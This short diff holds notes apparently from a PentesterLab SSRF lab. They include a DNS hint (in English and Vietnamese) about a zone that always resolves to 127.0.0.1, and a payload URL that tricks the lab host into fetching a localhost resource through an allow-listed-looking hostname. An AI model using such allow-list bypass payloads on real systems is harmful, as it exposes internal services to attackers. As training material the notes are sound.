@@ -1,0 +1,8 @@
+http://127.0.0.$1$:1234
+
+
+We setup a special DNS zone that will always answer 127.0.0.1 for any host in the domain hackingwithpentesterlab.link. That will probably help you.
+Chúng tôi thiết lập một vùng DNS đặc biệt sẽ luôn trả lời 127.0.0.1 cho bất kỳ máy chủ nào trong miền hackingwithpentesterlab.link. Điều đó có thể sẽ giúp bạn.
+
+
+http://ptl-c1aa7807-17922865.libcurl.so/?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/hacker.txt
